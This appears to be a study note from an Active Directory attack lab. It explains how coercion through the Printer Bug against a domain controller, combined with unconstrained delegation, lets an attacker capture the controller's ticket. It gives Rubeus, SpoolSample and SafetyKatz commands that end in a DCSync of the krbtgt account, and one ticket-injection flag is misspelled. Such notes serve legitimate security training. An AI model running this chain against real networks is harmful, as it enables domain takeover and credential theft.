
* Certain Microsoft services and protocols allow any authenticated user to force a machine to connect to a second machine.
* As of January 2025, following protocols and services can be used for coercion:

| Protocol | Service        | Default on Server OS      | Ports Required |
| -------- | -------------- | ------------------------- | -------------- |
| MS-RPRN  | Print Spooler  | Yes                       | 445 (SMB)      |
| MS-WSP   | Windows Search | No (Default on Client OS) | 445 (SMB)      |
| MS-DFSNM | DFS Namespaces | No                        | 445 (SMB)      |

# Diagram :

```
Priv Esc - Unconstrained Delegation - Coercion
    ==============================================

      [ Server 1 ]  <---------- Server2$ Connects ----------  [ Server 2 ]
      (dcorp-appsrv)                                          (dcorp-dc)
                                                                 ^
                                                                 |
                                                                 |
                                Coercion                         |
                       Please notify me on Server 1 -------------+
                                     |
                                     |
                                  [ User ]
```

> We can force the dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug (MS-RPRN) or if enabled, other services.

## Flow Breakdown

* The User sends a "Coercion" request to Server 2 (the Domain Controller), typically abusing the Printer Bug (MS-RPRN).
* The request tells Server 2: "Please notify me of a printer change on Server 1."
* Server 2 then connects to Server 1 using its computer account (Server2$).
* Because Server 1 has Unconstrained Delegation enabled, it captures the TGT (Ticket Granting Ticket) of Server 2 in its memory, allowing an attacker on Server 1 to impersonate the Domain Controller.


* We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
```
Rubeus.exe monitor /interval:5 /nowrap
```

* And after that run MS-RPRN.exe (or other) (https://github.com/leechristensen/SpoolSample) on the student VM:
```
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

* Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:
```
Rubeus.exe ptt /tikcet:
```

* Once the ticket is injected, run DCSync:
```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
```

